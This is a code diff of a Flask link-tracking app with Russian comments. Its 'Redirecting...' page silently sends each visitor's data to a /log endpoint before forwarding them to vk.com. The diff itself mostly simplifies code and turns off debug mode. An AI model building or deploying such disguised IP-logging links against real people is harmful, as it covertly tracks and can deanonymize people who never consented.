@@ -1,12 +1,10 @@
 from flask import Flask, request, redirect, render_template_string, jsonify
 import uuid
 import datetime
-import json
-import os
 
 app = Flask(__name__)
 
-# Хранилище ссылок и логов
+# Хранилище
 links_db = {}
 logs_db = {}
 
@@ -127,15 +125,9 @@ LOGGER_HTML = """
     <meta charset="UTF-8">
     <title>Redirecting...</title>
     <script>
-        // Отправляем данные о посетителе
         fetch('/log/' + window.location.pathname.split('/').pop())
-            .then(() => {
-                // Редирект на ВК
-                window.location.href = 'https://vk.com/';
-            })
-            .catch(() => {
-                window.location.href = 'https://vk.com/';
-            });
+            .then(() => window.location.href = 'https://vk.com/')
+            .catch(() => window.location.href = 'https://vk.com/');
     </script>
 </head>
 <body>
@@ -199,5 +191,6 @@ def get_stats(link_id):
         'total': len(logs_db.get(link_id, []))
     })
 
+# Важно: для Gunicorn
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    app.run()
